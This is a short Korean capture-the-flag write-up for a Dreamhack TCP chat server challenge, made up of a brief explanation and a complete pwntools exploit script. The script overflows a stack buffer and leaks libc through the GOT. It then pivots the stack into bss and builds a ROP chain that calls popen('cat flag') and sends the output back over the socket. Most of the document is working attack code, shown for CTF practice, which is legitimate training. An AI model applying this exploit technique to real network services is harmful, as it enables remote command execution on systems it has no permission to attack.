평범한 `rop`인데, 아무 조작 없이 그냥 `system`을 호출하는 건 안 된다. 그래서 `syscall`로 `orw` 구현해줬는데 뭔가 이상하게 안 됐다. 그래서 `popen`을 쓰기로 했다. 그런데 `popen` 결과물의 `fd`가 일정하지 않고 계속 변해서, `push rax ; pop rbx ; ret` 가젯을 써야 해결할 수 있었다. 그냥 `dup2` 쓰면 되는데 괜히 고생했다.

```python
from pwn import *

context.log_level = 'debug'

p = remote('host1.dreamhack.games', 11868)
#p = remote('localhost', 31337)
e = ELF('./chall')
l = ELF('./libc.so.6')
bss = e.bss() + 0x800
pop_rcx_rdx_rsi_rdi = 0x401396
pop_rdx_rsi_rdi = 0x401397
pop_rsi_rdi = 0x401398
pop_rdi = 0x401399
leave_ret = 0x4016ca
ret = 0x40101a

payload = b'/quit\n'.ljust(8, b'\x00') + b'a' * 0x338 + p64(bss) + p64(pop_rcx_rdx_rsi_rdi) + p64(0) + p64(8) + p64(e.got['read']) + p64(4) + p64(e.sym['send'])
payload += p64(pop_rdx_rsi_rdi) + p64(0x220) + p64(bss) + p64(4) + p64(e.sym['read']) + p64(leave_ret)
p.sendlineafter(b'Welcome to the TCP Chat Server!\n', payload)
l.address = u64(p.recvn(8)) - l.sym['read']
print(hex(l.address))

push_rax_pop_rbx = l.address + 0x0000000000174f5b
pop_rax = l.address + 0x0000000000045eb0
pop_rsi = l.address + 0x000000000002be51
add_ebx = 0x000000000040137c

payload = p64(bss + 0x120 + 0x3d)
payload += p64(pop_rsi_rdi) + p64(bss + 0x110) + p64(bss + 0x100) + p64(l.sym['popen'])
payload += p64(push_rax_pop_rbx) + p64(add_ebx)
payload += p64(pop_rcx_rdx_rsi_rdi) + p64(0) + p64(8) + p64(bss + 0x120) + p64(4) + p64(l.sym['send'])
payload += p64(pop_rdx_rsi_rdi) + p64(0x220) + p64(bss + 0x120 + 0x3d) + p64(4) + p64(e.sym['read']) + p64(leave_ret)
payload = payload.ljust(0x100, b'\x00')
payload += b'cat flag'.ljust(0x10, b'\x00') + b'r'.ljust(0x10, b'\x00')
p.send(payload)
fd = u64(p.recvn(8))
print(fd)

payload = p64(bss)
payload += p64(pop_rcx_rdx_rsi_rdi) + p64(fd) + p64(0x100) + p64(1) + p64(bss + 0x200) + p64(l.sym['fread'])
payload += p64(pop_rcx_rdx_rsi_rdi) + p64(0) + p64(0x100) + p64(bss + 0x200) + p64(4) + p64(l.sym['send'])
p.send(payload)
p.interactive()
```